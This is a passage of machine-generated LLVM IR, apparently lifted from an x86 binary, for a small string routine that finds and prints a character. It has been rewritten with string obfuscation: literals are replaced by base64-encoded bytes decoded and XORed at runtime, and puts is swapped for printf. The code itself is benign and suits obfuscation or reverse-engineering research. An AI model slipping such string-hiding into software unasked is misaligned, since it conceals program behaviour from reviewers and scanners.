  %tmp2_v7.i12.i = add i32 %tmp0_v.i2.i, -28
  %13 = inttoptr i32 %tmp2_v7.i12.i to i32*
  store i32 1684234849, i32* %13, align 4
  %tmp2_v8.i.i = add i32 %tmp0_v.i2.i, -24
  %14 = inttoptr i32 %tmp2_v8.i.i to i32*
  store i32 6776421, i32* %14, align 8
  %tmp2_v11.i.i = add i32 %tmp0_v.i2.i, -64
  %15 = inttoptr i32 %tmp2_v11.i.i to i32*
  store i32 %tmp2_v3.i9.i, i32* %15, align 16
  %tmp2_v12.i.i = add i32 %tmp0_v.i2.i, -68
  %16 = inttoptr i32 %tmp2_v12.i.i to i32*
  store i32 134517334, i32* %16, align 4
  %tmp2_v.i.i.i = add i32 %tmp0_v.i2.i, -72
  %17 = inttoptr i32 %tmp2_v.i.i.i to i32*
  store i32 %tmp2_v4.i.i, i32* %17, align 8
  %tmp2_v1.i.i.i = add i32 %tmp0_v.i2.i, -76
  %18 = inttoptr i32 %tmp2_v1.i.i.i to i32*
  store i32 0, i32* %18, align 4
  %tmp2_v2.i.i.i = add i32 %tmp0_v.i2.i, -80
  %19 = inttoptr i32 %tmp2_v2.i.i.i to i32*
  store i32 0, i32* %19, align 16
  %tmp2_v3.i.i.i = add i32 %tmp0_v.i2.i, -148
  %20 = inttoptr i32 %tmp2_v3.i.i.i to i32*
  store i32 134517384, i32* %20, align 4
  %tmp4_v.i.i.i.i = add i32 %tmp0_v.i2.i, -144
  %21 = load i32, i32* %15, align 16
  %tmp2_v2.i10.i.i = add i32 %tmp0_v.i2.i, -132
  %22 = inttoptr i32 %tmp2_v2.i10.i.i to i32*
  store i32 %21, i32* %22, align 4
  %23 = load i32, i32* %6, align 4
  %tmp2_v5.i.i.i = add i32 %tmp0_v.i2.i, -84
  %24 = inttoptr i32 %tmp2_v5.i.i.i to i32*
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* %22, align 4
  %tmp2_v9.i.i.i = add i32 %tmp0_v.i2.i, -160
  %26 = inttoptr i32 %tmp2_v9.i.i.i to i32*
  store i32 %25, i32* %26, align 16
  %tmp2_v10.i.i.i = add i32 %tmp0_v.i2.i, -164
  %27 = inttoptr i32 %tmp2_v10.i.i.i to i32*
  store i32 134517422, i32* %27, align 4
  %arg.i.i.i = load i32, i32* %26, align 16
  %28 = tail call i32 @strlen(i32 %arg.i.i.i)
  %tmp2_v.i171.i.i = add i32 %tmp0_v.i2.i, -96
  %29 = inttoptr i32 %tmp2_v.i171.i.i to i32*
  store i32 %28, i32* %29, align 16
  %tmp2_v3.i174.i.i = add i32 %28, -1
  %tmp2_v4.i175.i.i = add i32 %tmp0_v.i2.i, -92
  %30 = inttoptr i32 %tmp2_v4.i175.i.i to i32*
  store i32 %tmp2_v3.i174.i.i, i32* %30, align 4
  %tmp0_v5.i176.i.i = add i32 %28, 15
  %tmp0_v9.i177.i.i = and i32 %tmp0_v5.i176.i.i, -4096
  %tmp0_v11.i178.i.i = sub i32 %tmp4_v.i.i.i.i, %tmp0_v9.i177.i.i
  %tmp0_v.i218.i.i = and i32 %tmp0_v5.i176.i.i, 4080
  %tmp0_v1.i220.i.i = sub i32 %tmp4_v.i.i.i.i, %tmp0_v.i218.i.i
  %tmp2_v.i191.i.i = add i32 %tmp0_v.i2.i, -88
  %31 = inttoptr i32 %tmp2_v.i191.i.i to i32*
  store i32 %tmp0_v1.i220.i.i, i32* %31, align 8
  %tmp2_v4.i192.i.i = add i32 %tmp0_v.i2.i, -116
  %32 = inttoptr i32 %tmp2_v4.i192.i.i to i32*
  store i32 0, i32* %32, align 4
  %tmp2_v5.i193.i.i = add i32 %tmp0_v.i2.i, -112
  %33 = inttoptr i32 %tmp2_v5.i193.i.i to i32*
  store i32 0, i32* %33, align 16
  %34 = load i32, i32* %29, align 16
  %35 = icmp sgt i32 %34, 0
  br i1 %35, label %BB_8049338.i.lr.ph.i, label %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i

helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i: ; preds = %.exit
  %.pre20.i = add i32 %tmp0_v.i2.i, -122
  %.pre21.i = inttoptr i32 %.pre20.i to i8*
  %.pre22.i = add i32 %tmp0_v.i2.i, -120
  %.pre23.i = inttoptr i32 %.pre22.i to i32*
  br label %Func_print_min_char.exit

BB_8049338.i.lr.ph.i:                             ; preds = %.exit
  %tmp2_v.i195.i.i = add i32 %tmp0_v.i2.i, -121
  %36 = inttoptr i32 %tmp2_v.i195.i.i to i8*
  %tmp2_v1.i196.i.i = add i32 %tmp0_v.i2.i, -108
  %37 = inttoptr i32 %tmp2_v1.i196.i.i to i32*
  %tmp2_v.i46.i.i = add i32 %tmp0_v.i2.i, -104
  %38 = inttoptr i32 %tmp2_v.i46.i.i to i32*
  %tmp2_v1.i47.i.i = add i32 %tmp0_v.i2.i, -100
  %39 = inttoptr i32 %tmp2_v1.i47.i.i to i32*
  %tmp2_v1.i163.i.i = add i32 %tmp0_v.i2.i, -120
  %40 = inttoptr i32 %tmp2_v1.i163.i.i to i32*
  %tmp2_v8.i233.i.i = add i32 %tmp0_v.i2.i, -122
  %41 = inttoptr i32 %tmp2_v8.i233.i.i to i8*
  br label %BB_8049338.i.i

BB_8049345.i.i:                                   ; preds = %BB_8049338.i.i, %BB_8049363.i.i
  %storemerge112.i = phi i32 [ %tmp0_v1.i124.i.i, %BB_8049363.i.i ], [ 0, %BB_8049338.i.i ]
  %42 = load i32, i32* %33, align 16
  %43 = load i32, i32* %22, align 4
  %tmp0_v3.i.i.i = add i32 %43, %42
  %44 = inttoptr i32 %tmp0_v3.i.i.i to i8*
  %45 = load i8, i8* %44, align 1
  %tmp0_v4.i19.i.i = zext i8 %45 to i32
  %46 = load i32, i32* %31, align 8
  %tmp0_v9.i.i.i = add i32 %46, %storemerge112.i
  %47 = inttoptr i32 %tmp0_v9.i.i.i to i8*
  %48 = load i8, i8* %47, align 1
  %tmp0_v10.i.i.i = zext i8 %48 to i32
  %cc_dst_v.i.i.i = sub nsw i32 %tmp0_v4.i19.i.i, %tmp0_v10.i.i.i
  %tmp4_v.i24.i.i = and i32 %cc_dst_v.i.i.i, 255
  %.not.i.i.i = icmp eq i32 %tmp4_v.i24.i.i, 0
  br i1 %.not.i.i.i, label %BB_804935F.i.i, label %BB_8049363.i.i

BB_8049407.i.sink.split.i:                        ; preds = %BB_80493E8.i.i, %BB_80493B3.i.i
  store i32 %68, i32* %40, align 8
  %.sink26.i = load i32, i32* %33, align 16
  %49 = load i32, i32* %22, align 4
  %tmp0_v6.i231.i.i = add i32 %49, %.sink26.i
  %50 = inttoptr i32 %tmp0_v6.i231.i.i to i8*
  %51 = load i8, i8* %50, align 1
  store i8 %51, i8* %41, align 2
  br label %BB_8049407.i.i

BB_8049407.i.i:                                   ; preds = %BB_80493E8.i.i, %BB_804936F.i.i, %BB_8049407.i.sink.split.i
  %r_ecx.0.i = phi i32 [ %64, %BB_80493E8.i.i ], [ %r_ecx.1.lcssa.i, %BB_804936F.i.i ], [ %64, %BB_8049407.i.sink.split.i ]
  %r_edx.0.i = phi i32 [ %tmp0_v9.i87.i.i, %BB_80493E8.i.i ], [ %r_edx.1.lcssa.i, %BB_804936F.i.i ], [ %.sink26.i, %BB_8049407.i.sink.split.i ]
  %52 = load i32, i32* %33, align 16
  %tmp0_v1.i29.i.i = add i32 %52, 1
  store i32 %tmp0_v1.i29.i.i, i32* %33, align 16
  %53 = load i32, i32* %29, align 16
  %54 = icmp slt i32 %tmp0_v1.i29.i.i, %53
  br i1 %54, label %BB_8049338.i.i, label %Func_print_min_char.exit

BB_80493A7.i.i:                                   ; preds = %BB_80493A3.i.i, %BB_8049389.i.i
  %55 = phi i32 [ %storemerge214.i, %BB_8049389.i.i ], [ %.pre19.i, %BB_80493A3.i.i ]
  %tmp0_v1.i38.i.i = add i32 %55, 1
  store i32 %tmp0_v1.i38.i.i, i32* %39, align 4
  %56 = load i32, i32* %29, align 16
  %57 = icmp slt i32 %tmp0_v1.i38.i.i, %56
  br i1 %57, label %BB_8049389.i.i, label %BB_80493B3.i.i

BB_8049379.i.i:                                   ; preds = %BB_804936F.i.i
  store i32 0, i32* %38, align 8
  store i32 0, i32* %39, align 4
  %58 = load i32, i32* %29, align 16
  %59 = icmp sgt i32 %58, 0
  br i1 %59, label %BB_8049389.i.i, label %BB_80493B3.i.i

BB_804935F.i.i:                                   ; preds = %BB_8049345.i.i
  store i8 1, i8* %36, align 1
  %.pre.i = load i32, i32* %37, align 4
  br label %BB_8049363.i.i

BB_80493B3.i.i:                                   ; preds = %BB_8049379.i.i, %BB_80493A7.i.i
  %60 = load i32, i32* %33, align 16
  %61 = load i32, i32* %22, align 4
  %tmp0_v3.i81.i.i = add i32 %61, %60
  %62 = inttoptr i32 %tmp0_v3.i81.i.i to i8*
  %63 = load i8, i8* %62, align 1
  %64 = load i32, i32* %31, align 8
  %65 = load i32, i32* %32, align 4
  %tmp0_v9.i87.i.i = add i32 %65, %64
  %66 = inttoptr i32 %tmp0_v9.i87.i.i to i8*
  store i8 %63, i8* %66, align 1
  %67 = load i32, i32* %32, align 4
  %tmp0_v12.i.i.i = add i32 %67, 1
  store i32 %tmp0_v12.i.i.i, i32* %32, align 4
  %.not.i90.i.i = icmp eq i32 %67, 0
  %68 = load i32, i32* %38, align 8
  br i1 %.not.i90.i.i, label %BB_8049407.i.sink.split.i, label %BB_80493E8.i.i

BB_8049363.i.i:                                   ; preds = %BB_804935F.i.i, %BB_8049345.i.i
  %69 = phi i32 [ %storemerge112.i, %BB_8049345.i.i ], [ %.pre.i, %BB_804935F.i.i ]
  %tmp0_v1.i124.i.i = add i32 %69, 1
  store i32 %tmp0_v1.i124.i.i, i32* %37, align 4
  %70 = load i32, i32* %32, align 4
  %71 = icmp slt i32 %tmp0_v1.i124.i.i, %70
  br i1 %71, label %BB_8049345.i.i, label %BB_804936F.i.i

BB_804936F.i.i:                                   ; preds = %BB_8049338.i.i, %BB_8049363.i.i
  %r_ecx.1.lcssa.i = phi i32 [ %r_ecx.215.i, %BB_8049338.i.i ], [ %46, %BB_8049363.i.i ]
  %r_edx.1.lcssa.i = phi i32 [ %r_edx.216.i, %BB_8049338.i.i ], [ %tmp0_v4.i19.i.i, %BB_8049363.i.i ]
  %72 = load i8, i8* %36, align 1
  %.not.i134.i.i = icmp eq i8 %72, 0
  br i1 %.not.i134.i.i, label %BB_8049379.i.i, label %BB_8049407.i.i

BB_8049389.i.i:                                   ; preds = %BB_8049379.i.i, %BB_80493A7.i.i
  %storemerge214.i = phi i32 [ %tmp0_v1.i38.i.i, %BB_80493A7.i.i ], [ 0, %BB_8049379.i.i ]
  %73 = load i32, i32* %33, align 16
  %74 = load i32, i32* %22, align 4
  %tmp0_v3.i141.i.i = add i32 %74, %73
  %75 = inttoptr i32 %tmp0_v3.i141.i.i to i8*
  %76 = load i8, i8* %75, align 1
  %tmp0_v4.i142.i.i = zext i8 %76 to i32
  %tmp0_v9.i147.i.i = add i32 %74, %storemerge214.i
  %77 = inttoptr i32 %tmp0_v9.i147.i.i to i8*
  %78 = load i8, i8* %77, align 1
  %tmp0_v10.i148.i.i = zext i8 %78 to i32
  %cc_dst_v.i149.i.i = sub nsw i32 %tmp0_v4.i142.i.i, %tmp0_v10.i148.i.i
  %tmp4_v.i150.i.i = and i32 %cc_dst_v.i149.i.i, 255
  %.not.i151.i.i = icmp eq i32 %tmp4_v.i150.i.i, 0
  br i1 %.not.i151.i.i, label %BB_80493A3.i.i, label %BB_80493A7.i.i

BB_80493E8.i.i:                                   ; preds = %BB_80493B3.i.i
  %79 = load i32, i32* %40, align 8
  %.not.i166.i.i = icmp slt i32 %68, %79
  br i1 %.not.i166.i.i, label %BB_8049407.i.sink.split.i, label %BB_8049407.i.i

BB_8049338.i.i:                                   ; preds = %BB_8049407.i.i, %BB_8049338.i.lr.ph.i
  %r_edx.216.i = phi i32 [ %tmp0_v.i218.i.i, %BB_8049338.i.lr.ph.i ], [ %r_edx.0.i, %BB_8049407.i.i ]
  %r_ecx.215.i = phi i32 [ %tmp0_v11.i178.i.i, %BB_8049338.i.lr.ph.i ], [ %r_ecx.0.i, %BB_8049407.i.i ]
  store i8 0, i8* %36, align 1
  store i32 0, i32* %37, align 4
  %80 = load i32, i32* %32, align 4
  %81 = icmp sgt i32 %80, 0
  br i1 %81, label %BB_8049345.i.i, label %BB_804936F.i.i

BB_80493A3.i.i:                                   ; preds = %BB_8049389.i.i
  %82 = load i32, i32* %38, align 8
  %tmp0_v1.i207.i.i = add i32 %82, 1
  store i32 %tmp0_v1.i207.i.i, i32* %38, align 8
  %.pre19.i = load i32, i32* %39, align 4
  br label %BB_80493A7.i.i

Func_print_min_char.exit:                         ; preds = %BB_8049407.i.i, %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i
  %.pre-phi24.i = phi i32* [ %.pre23.i, %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i ], [ %40, %BB_8049407.i.i ]
  %.pre-phi.i = phi i8* [ %.pre21.i, %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i ], [ %41, %BB_8049407.i.i ]
  %r_ecx.2.lcssa.i = phi i32 [ %tmp0_v11.i178.i.i, %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i ], [ %r_ecx.0.i, %BB_8049407.i.i ]
  %r_edx.2.lcssa.i = phi i32 [ %tmp0_v.i218.i.i, %helper_divl_EAX.exit.i.Func_8049417.exit.i_crit_edge.i ], [ %r_edx.0.i, %BB_8049407.i.i ]
  %83 = load i8, i8* %.pre-phi.i, align 1
  %tmp0_v.i104.i.i = sext i8 %83 to i32
  %84 = load i32, i32* %.pre-phi24.i, align 4
  %tmp2_v4.i109.i.i = add i32 %tmp0_v1.i220.i.i, -8
  %85 = inttoptr i32 %tmp2_v4.i109.i.i to i32*
  store i32 %84, i32* %85, align 8
  %tmp2_v5.i110.i.i = add i32 %tmp0_v1.i220.i.i, -12
  %86 = inttoptr i32 %tmp2_v5.i110.i.i to i32*
  store i32 %tmp0_v.i104.i.i, i32* %86, align 4
  %tmp2_v7.i112.i.i = add i32 %tmp0_v1.i220.i.i, -16
  %87 = inttoptr i32 %tmp2_v7.i112.i.i to i32*
;-------------------------------
; Replace: %spi.bis.393 = ptrtoint[7 x i8]* @str.bis.393 to i32
  %sp0.35 = alloca [7 x i8]
;-------------------------------
; Replace: store [7 x i8] c"\15\33\5F\4C\34\5A\41", [7 x i8]* %sp0.35
  %sp145 = alloca [7 x i8]
  
;-------------------------------
; Replace: %s0.145 = load [1 x i8], [1 x i8]* @str.0.145
  %cipher.ptr.434 = alloca [5 x i8]
  store [5 x i8] c"\46\51\3d\3d\00", [5 x i8]* %cipher.ptr.434
  %cipher.434 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.434, i32 0, i32 0
  %plain.ptr.434 = tail call i8* @base64_decode(i8* %cipher.434)
  %spi434 = bitcast i8* %plain.ptr.434 to [1 x i8]*
  %s0.145 = load [1 x i8], [1 x i8]* %spi434
;-------------------------------
  %sp0.145 = bitcast [7 x i8]* %sp145 to [1 x i8]*
  store [1 x i8] %s0.145, [1 x i8]* %sp0.145
  %next0.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.145 = load [1 x i8], [1 x i8]* @str.1.145
  %cipher.ptr.431 = alloca [5 x i8]
  store [5 x i8] c"\4d\77\3d\3d\00", [5 x i8]* %cipher.ptr.431
  %cipher.431 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.431, i32 0, i32 0
  %plain.ptr.431 = tail call i8* @base64_decode(i8* %cipher.431)
  %spi431 = bitcast i8* %plain.ptr.431 to [1 x i8]*
  %s1.145 = load [1 x i8], [1 x i8]* %spi431
;-------------------------------
  %sp1.145 = bitcast i8* %next0.145 to [1 x i8]*
  store [1 x i8] %s1.145, [1 x i8]* %sp1.145
  %next1.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.145 = load [1 x i8], [1 x i8]* @str.2.145
  %cipher.ptr.433 = alloca [5 x i8]
  store [5 x i8] c"\58\77\3d\3d\00", [5 x i8]* %cipher.ptr.433
  %cipher.433 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.433, i32 0, i32 0
  %plain.ptr.433 = tail call i8* @base64_decode(i8* %cipher.433)
  %spi433 = bitcast i8* %plain.ptr.433 to [1 x i8]*
  %s2.145 = load [1 x i8], [1 x i8]* %spi433
;-------------------------------
  %sp2.145 = bitcast i8* %next1.145 to [1 x i8]*
  store [1 x i8] %s2.145, [1 x i8]* %sp2.145
  %next2.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.145 = load [1 x i8], [1 x i8]* @str.3.145
  %cipher.ptr.430 = alloca [5 x i8]
  store [5 x i8] c"\54\41\3d\3d\00", [5 x i8]* %cipher.ptr.430
  %cipher.430 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.430, i32 0, i32 0
  %plain.ptr.430 = tail call i8* @base64_decode(i8* %cipher.430)
  %spi430 = bitcast i8* %plain.ptr.430 to [1 x i8]*
  %s3.145 = load [1 x i8], [1 x i8]* %spi430
;-------------------------------
  %sp3.145 = bitcast i8* %next2.145 to [1 x i8]*
  store [1 x i8] %s3.145, [1 x i8]* %sp3.145
  %next3.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 4
  
;-------------------------------
; Replace: %s4.145 = load [1 x i8], [1 x i8]* @str.4.145
  %cipher.ptr.428 = alloca [5 x i8]
  store [5 x i8] c"\4e\41\3d\3d\00", [5 x i8]* %cipher.ptr.428
  %cipher.428 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.428, i32 0, i32 0
  %plain.ptr.428 = tail call i8* @base64_decode(i8* %cipher.428)
  %spi428 = bitcast i8* %plain.ptr.428 to [1 x i8]*
  %s4.145 = load [1 x i8], [1 x i8]* %spi428
;-------------------------------
  %sp4.145 = bitcast i8* %next3.145 to [1 x i8]*
  store [1 x i8] %s4.145, [1 x i8]* %sp4.145
  %next4.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 5
  
;-------------------------------
; Replace: %s5.145 = load [1 x i8], [1 x i8]* @str.5.145
  %cipher.ptr.429 = alloca [5 x i8]
  store [5 x i8] c"\57\67\3d\3d\00", [5 x i8]* %cipher.ptr.429
  %cipher.429 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.429, i32 0, i32 0
  %plain.ptr.429 = tail call i8* @base64_decode(i8* %cipher.429)
  %spi429 = bitcast i8* %plain.ptr.429 to [1 x i8]*
  %s5.145 = load [1 x i8], [1 x i8]* %spi429
;-------------------------------
  %sp5.145 = bitcast i8* %next4.145 to [1 x i8]*
  store [1 x i8] %s5.145, [1 x i8]* %sp5.145
  %next5.145 = getelementptr [7 x i8], [7 x i8]* %sp145, i32 0, i32 6
  
;-------------------------------
; Replace: %s6.145 = load [1 x i8], [1 x i8]* @str.6.145
  %cipher.ptr.432 = alloca [5 x i8]
  store [5 x i8] c"\51\51\3d\3d\00", [5 x i8]* %cipher.ptr.432
  %cipher.432 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.432, i32 0, i32 0
  %plain.ptr.432 = tail call i8* @base64_decode(i8* %cipher.432)
  %spi432 = bitcast i8* %plain.ptr.432 to [1 x i8]*
  %s6.145 = load [1 x i8], [1 x i8]* %spi432
;-------------------------------
  %sp6.145 = bitcast i8* %next5.145 to [1 x i8]*
  store [1 x i8] %s6.145, [1 x i8]* %sp6.145

  %spi145 = load [7 x i8], [7 x i8]* %sp145
  store [7 x i8] %spi145, [7 x i8]* %sp0.35
;-------------------------------
  %sp0.1.35 = bitcast [7 x i8]* %sp0.35 to i56*
  %i0.35 = load i56, i56* %sp0.1.35

  %sp1.35 = alloca [7 x i8]
;-------------------------------
; Replace: store [7 x i8] c"\30\50\65\69\50\50\41", [7 x i8]* %sp1.35
  %sp146 = alloca [7 x i8]
  
;-------------------------------
; Replace: %s0.146 = load [1 x i8], [1 x i8]* @str.0.146
  %cipher.ptr.441 = alloca [5 x i8]
  store [5 x i8] c"\4d\41\3d\3d\00", [5 x i8]* %cipher.ptr.441
  %cipher.441 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.441, i32 0, i32 0
  %plain.ptr.441 = tail call i8* @base64_decode(i8* %cipher.441)
  %spi441 = bitcast i8* %plain.ptr.441 to [1 x i8]*
  %s0.146 = load [1 x i8], [1 x i8]* %spi441
;-------------------------------
  %sp0.146 = bitcast [7 x i8]* %sp146 to [1 x i8]*
  store [1 x i8] %s0.146, [1 x i8]* %sp0.146
  %next0.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.146 = load [1 x i8], [1 x i8]* @str.1.146
  %cipher.ptr.440 = alloca [5 x i8]
  store [5 x i8] c"\55\41\3d\3d\00", [5 x i8]* %cipher.ptr.440
  %cipher.440 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.440, i32 0, i32 0
  %plain.ptr.440 = tail call i8* @base64_decode(i8* %cipher.440)
  %spi440 = bitcast i8* %plain.ptr.440 to [1 x i8]*
  %s1.146 = load [1 x i8], [1 x i8]* %spi440
;-------------------------------
  %sp1.146 = bitcast i8* %next0.146 to [1 x i8]*
  store [1 x i8] %s1.146, [1 x i8]* %sp1.146
  %next1.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.146 = load [1 x i8], [1 x i8]* @str.2.146
  %cipher.ptr.438 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.438
  %cipher.438 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.438, i32 0, i32 0
  %plain.ptr.438 = tail call i8* @base64_decode(i8* %cipher.438)
  %spi438 = bitcast i8* %plain.ptr.438 to [1 x i8]*
  %s2.146 = load [1 x i8], [1 x i8]* %spi438
;-------------------------------
  %sp2.146 = bitcast i8* %next1.146 to [1 x i8]*
  store [1 x i8] %s2.146, [1 x i8]* %sp2.146
  %next2.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.146 = load [1 x i8], [1 x i8]* @str.3.146
  %cipher.ptr.439 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.439
  %cipher.439 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.439, i32 0, i32 0
  %plain.ptr.439 = tail call i8* @base64_decode(i8* %cipher.439)
  %spi439 = bitcast i8* %plain.ptr.439 to [1 x i8]*
  %s3.146 = load [1 x i8], [1 x i8]* %spi439
;-------------------------------
  %sp3.146 = bitcast i8* %next2.146 to [1 x i8]*
  store [1 x i8] %s3.146, [1 x i8]* %sp3.146
  %next3.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 4
  
;-------------------------------
; Replace: %s4.146 = load [1 x i8], [1 x i8]* @str.4.146
  %cipher.ptr.435 = alloca [5 x i8]
  store [5 x i8] c"\55\41\3d\3d\00", [5 x i8]* %cipher.ptr.435
  %cipher.435 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.435, i32 0, i32 0
  %plain.ptr.435 = tail call i8* @base64_decode(i8* %cipher.435)
  %spi435 = bitcast i8* %plain.ptr.435 to [1 x i8]*
  %s4.146 = load [1 x i8], [1 x i8]* %spi435
;-------------------------------
  %sp4.146 = bitcast i8* %next3.146 to [1 x i8]*
  store [1 x i8] %s4.146, [1 x i8]* %sp4.146
  %next4.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 5
  
;-------------------------------
; Replace: %s5.146 = load [1 x i8], [1 x i8]* @str.5.146
  %cipher.ptr.436 = alloca [5 x i8]
  store [5 x i8] c"\55\41\3d\3d\00", [5 x i8]* %cipher.ptr.436
  %cipher.436 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.436, i32 0, i32 0
  %plain.ptr.436 = tail call i8* @base64_decode(i8* %cipher.436)
  %spi436 = bitcast i8* %plain.ptr.436 to [1 x i8]*
  %s5.146 = load [1 x i8], [1 x i8]* %spi436
;-------------------------------
  %sp5.146 = bitcast i8* %next4.146 to [1 x i8]*
  store [1 x i8] %s5.146, [1 x i8]* %sp5.146
  %next5.146 = getelementptr [7 x i8], [7 x i8]* %sp146, i32 0, i32 6
  
;-------------------------------
; Replace: %s6.146 = load [1 x i8], [1 x i8]* @str.6.146
  %cipher.ptr.437 = alloca [5 x i8]
  store [5 x i8] c"\51\51\3d\3d\00", [5 x i8]* %cipher.ptr.437
  %cipher.437 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.437, i32 0, i32 0
  %plain.ptr.437 = tail call i8* @base64_decode(i8* %cipher.437)
  %spi437 = bitcast i8* %plain.ptr.437 to [1 x i8]*
  %s6.146 = load [1 x i8], [1 x i8]* %spi437
;-------------------------------
  %sp6.146 = bitcast i8* %next5.146 to [1 x i8]*
  store [1 x i8] %s6.146, [1 x i8]* %sp6.146

  %spi146 = load [7 x i8], [7 x i8]* %sp146
  store [7 x i8] %spi146, [7 x i8]* %sp1.35
;-------------------------------
  %sp1.1.35 = bitcast [7 x i8]* %sp1.35 to i56*
  %i1.35 = load i56, i56* %sp1.1.35

  %xp35 = xor i56 %i0.35, %i1.35

  %fi.35 = alloca i56
  store i56 %xp35, i56* %fi.35

  %spi35 = bitcast i56* %fi.35 to [7 x i8]*
  %spi.bis.393 = ptrtoint[7 x i8]* %spi35 to i32
;-------------------------------
  store i32 %spi.bis.393, i32* %87, align 16
  %tmp2_v8.i113.i.i = add i32 %tmp0_v1.i220.i.i, -20
  %88 = inttoptr i32 %tmp2_v8.i113.i.i to i32*
  store i32 134517812, i32* %88, align 4
  %89 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %r_ecx.2.lcssa.i, i32 inreg noundef %r_edx.2.lcssa.i, i32 noundef %tmp2_v7.i112.i.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32))  nobuiltin nounwind "no-builtins" , !funcname !226
  ret void
}
define internal fastcc void @token_pasting_operator701(i32 %arg_esp) unnamed_addr  norecurse  !retregs !211 {
  %tmp2_v.i42.i = add i32 %arg_esp, 4
  %tmp0_v.i43.i = and i32 %arg_esp, -16
  %1 = inttoptr i32 %arg_esp to i32*
  %2 = load i32, i32* %1, align 4
  %tmp2_v3.i45.i = add i32 %tmp0_v.i43.i, -4
  %3 = inttoptr i32 %tmp2_v3.i45.i to i32*
  store i32 %2, i32* %3, align 4
  %tmp2_v4.i46.i = add i32 %tmp0_v.i43.i, -8
  %4 = inttoptr i32 %tmp2_v4.i46.i to i32*
  store i32 0, i32* %4, align 8
  %tmp2_v5.i48.i = add i32 %tmp0_v.i43.i, -12
  %5 = inttoptr i32 %tmp2_v5.i48.i to i32*
  store i32 0, i32* %5, align 4
  %tmp2_v6.i50.i = add i32 %tmp0_v.i43.i, -16
  %6 = inttoptr i32 %tmp2_v6.i50.i to i32*
  store i32 0, i32* %6, align 16
  %tmp2_v7.i52.i = add i32 %tmp0_v.i43.i, -20
  %7 = inttoptr i32 %tmp2_v7.i52.i to i32*
  store i32 0, i32* %7, align 4
  %tmp2_v8.i54.i = add i32 %tmp0_v.i43.i, -24
  %8 = inttoptr i32 %tmp2_v8.i54.i to i32*
  store i32 %tmp2_v.i42.i, i32* %8, align 8
  %tmp2_v10.i56.i = add i32 %tmp0_v.i43.i, -276
  %9 = inttoptr i32 %tmp2_v10.i56.i to i32*
  store i32 134517364, i32* %9, align 4
  %tmp4_v.i25.i.b = load i1, i1* @segs.0, align 1
  %10 = inttoptr i32 %arg_esp to i32*
  %11 = load i32, i32* %10, align 4
  %tmp2_v2.i29.i = add i32 %tmp0_v.i43.i, -36
  %12 = inttoptr i32 %tmp2_v2.i29.i to i32*
  store i32 %11, i32* %12, align 4
  %tmp2_v3.i.i = add i32 %tmp0_v.i43.i, -46
  %13 = inttoptr i32 %tmp2_v3.i.i to i32*
  store i32 543648066, i32* %13, align 4
  %tmp2_v4.i.i = add i32 %tmp0_v.i43.i, -42
  %14 = inttoptr i32 %tmp2_v4.i.i to i32*
  store i32 1819308097, i32* %14, align 4
  %tmp2_v5.i.i = add i32 %tmp0_v.i43.i, -38
  %15 = inttoptr i32 %tmp2_v5.i.i to i16*
  store i16 101, i16* %15, align 2
  %tmp2_v6.i.i = add i32 %tmp0_v.i43.i, -55
  %16 = inttoptr i32 %tmp2_v6.i.i to i32*
  store i32 543648066, i32* %16, align 4
  %tmp2_v7.i30.i = add i32 %tmp0_v.i43.i, -51
  %17 = inttoptr i32 %tmp2_v7.i30.i to i32*
  store i32 1918985552, i32* %17, align 4
  %tmp2_v8.i31.i = add i32 %tmp0_v.i43.i, -47
  %18 = inttoptr i32 %tmp2_v8.i31.i to i8*
  store i8 0, i8* %18, align 1
  %tmp2_v11.i.i = add i32 %tmp0_v.i43.i, -288
  %19 = inttoptr i32 %tmp2_v11.i.i to i32*
  store i32 %tmp2_v3.i.i, i32* %19, align 16
  %tmp2_v12.i.i = add i32 %tmp0_v.i43.i, -292
  %20 = inttoptr i32 %tmp2_v12.i.i to i32*
  store i32 134517431, i32* %20, align 4
  %arg.i.i = load i32, i32* %19, align 16
  %21 = inttoptr i32 %arg.i.i to i8*
;-------------------------------
;---Replaced puts with printf---
